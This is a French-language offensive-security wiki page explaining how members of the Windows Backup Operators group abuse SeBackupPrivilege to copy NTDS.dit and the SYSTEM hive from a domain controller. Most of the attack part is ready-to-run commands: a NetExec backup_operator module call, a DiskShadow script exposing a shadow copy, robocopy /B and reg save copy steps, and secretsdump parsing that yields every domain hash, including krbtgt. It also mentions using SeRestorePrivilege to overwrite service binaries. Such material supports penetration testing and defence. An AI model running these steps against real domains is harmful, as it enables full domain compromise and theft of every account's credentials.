---
title: "Backup Operators : lire NTDS.dit avec SeBackupPrivilege"
order: 9
description: "Exploitation de l'appartenance au groupe Backup Operators, qui accorde SeBackupPrivilege, pour lire des fichiers au-delà de leurs ACL et extraire NTDS.dit et la ruche SYSTEM d'un contrôleur de domaine, livrant chaque empreinte du domaine."
keywords:
  - Backup Operators
  - SeBackupPrivilege
  - NTDS.dit
  - diskshadow
  - secretsdump
---

# Backup Operators

Le groupe **Backup Operators** accorde **`SeBackupPrivilege`** (et `SeRestorePrivilege`) : le droit de lire (et d'écrire) n'importe quel fichier indépendamment de son ACL, pour que les sauvegardes puissent s'exécuter. Appliqué à un contrôleur de domaine, ce droit lit le seul fichier qui compte, **`NTDS.dit`**, plus la ruche **SYSTEM** qui le déchiffre, vous livrant l'empreinte de chaque compte. L'appartenance à Backup Operators équivaut donc en pratique à Domain Admin, atteignable sans jamais faire partie d'un groupe AD privilégié.

## Extraire la base de données du domaine

`NTDS.dit` est verrouillé tant que le DC tourne, vous le lisez donc depuis une **copie fantôme (shadow copy)**, en utilisant le privilège de sauvegarde pour contourner l'ACL. Avec **seulement** les droits Backup Operators, utilisez l'outillage spécifique à Backup Operator plutôt que la voie générique de VSS à distance :

```bash
# NetExec backup_operator module: snapshots, pulls NTDS.dit + SYSTEM, prints the secretsdump line
nxc smb <dc> -u backupop -p password -M backup_operator
```

En local (en tant que membre de Backup Operators), DiskShadow prend un **fichier de script** avec une directive par ligne (les points-virgules ne sont pas des séparateurs), et les commandes externes s'exécutent via `exec` :

```text
# shadow.txt  ->  run with:  diskshadow /s shadow.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
add volume C: alias cc
create
expose %cc% Z:
exec C:\Windows\Temp\copy.cmd
reset
```

```text
# copy.cmd (invoked by the exec line): backup-mode copy off the snapshot
robocopy /B Z:\Windows\NTDS C:\Windows\Temp NTDS.dit
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```

```bash
# parse the files offline
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

Le `secretsdump.py -use-vss` générique d'Impacket n'est **pas** utilisable avec Backup Operators seul : il pilote `vssadmin` et RemoteRegistry via le gestionnaire de contrôle de services, ce qui nécessite des droits d'administrateur local ; gardez-le donc pour quand vous détenez aussi un identifiant d'administrateur.

## Notes d'exploitation

- Le résultat est le vidage complet de [NTDS](../authentication/credentials/ntds-and-dcsync.md) : `krbtgt`, chaque empreinte d'utilisateur et d'ordinateur, les clés AES, il s'agit donc d'une compromission du domaine, équivalente à DCSync mais à travers le système de fichiers.
- `SeBackupPrivilege` lit également les ruches **SAM/SECURITY/SYSTEM locales** de n'importe quel hôte pour ses secrets locaux, utile sur les serveurs membres où le compte est un Backup Operator local.
- `SeRestorePrivilege` en est le pendant en écriture : écraser des fichiers protégés (binaires de service, DLL) pour obtenir l'exécution de code là où la lecture ne suffit pas.
- Les Backup Operators peuvent ouvrir une session sur les DC, une voie DiskShadow en local est donc disponible lorsque le VSS à distance est bloqué.

## Outils

- **NetExec `-M backup_operator`** : vidage NTDS automatisé via Backup Operator (DiskShadow + robocopy /B + ruche SYSTEM) sur SMB.
- **diskshadow + robocopy /B** : instantané natif en local et copie en mode sauvegarde.
- **Impacket `secretsdump.py -use-vss`** : lecture NTDS via VSS à distance, mais nécessite des droits d'administrateur local, pas Backup Operators seul.

## Références

- [NetExec wiki: dumping with Backup Operator privileges](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-backupop)
- [Hacking Articles: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [qazeer notes: operators to Domain Admins](https://notes.qazeer.io/active-directory/exploitation-operators_to_domain_admins)
